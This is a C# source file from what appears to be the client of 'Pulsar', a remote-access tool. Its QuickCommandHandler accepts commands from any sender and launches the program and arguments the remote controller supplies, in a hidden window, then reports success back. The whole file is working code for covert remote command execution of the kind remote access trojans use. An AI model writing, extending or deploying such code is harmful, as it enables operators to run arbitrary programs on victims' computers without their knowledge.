using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using Pulsar.Common.Messages.FunStuff;
using Pulsar.Common.Messages.Other;
using Pulsar.Client.FunStuff;
using Pulsar.Common.Messages.QuickCommands;
using System.Diagnostics;

namespace Pulsar.Client.Messages
{

    public class QuickCommandHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoSendQuickCommand;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoSendQuickCommand msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoSendQuickCommand message)
        {
            client.Send(new SetStatus { Message = "Successful Quick Command" });

            //execute a new powershell with the command
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = message.Host;
            startInfo.Arguments = message.Command;
            process.StartInfo = startInfo;
            process.Start();
        }
    }
}
